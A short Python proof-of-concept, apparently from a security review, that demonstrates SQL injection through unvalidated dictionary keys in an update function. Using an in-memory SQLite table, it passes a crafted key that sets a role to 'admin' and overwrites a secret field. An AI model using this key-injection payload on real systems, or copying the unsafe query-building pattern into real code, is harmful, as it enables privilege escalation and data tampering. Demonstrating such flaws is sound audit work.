import sqlite3

db = sqlite3.connect(':memory:')
db.execute("CREATE TABLE test (id TEXT PRIMARY KEY, tenant TEXT, project_id TEXT, secret TEXT, role TEXT)")
db.execute("INSERT INTO test (id, tenant, project_id, secret, role) VALUES ('1', 't1', 'p1', 'safe', 'user')")

# The update_memory sets fields via `set_clause = ", ".join([f"{k} = ?" for k in serialized.keys()])`
# Since it does not validate the keys themselves against a schema whitelist (except for forbidden_keys like id, tenant, etc),
# an attacker can pass `role = 'admin', secret` as a key to bypass any validations on role if 'role' is otherwise filtered out or not expected.
updates = {"role = 'admin', secret": "hacked"}
set_clause = ", ".join([f"{k} = ?" for k in updates.keys()])
query = f"UPDATE test SET {set_clause} WHERE id = ? AND tenant = ? AND project_id = ?"
print(f"Query: {query}")
try:
    db.execute(query, list(updates.values()) + ['1', 't1', 'p1'])
    print("Execution successful")
except Exception as e:
    print(f"Error: {e}")
cur = db.execute("SELECT * FROM test")
print(cur.fetchall())
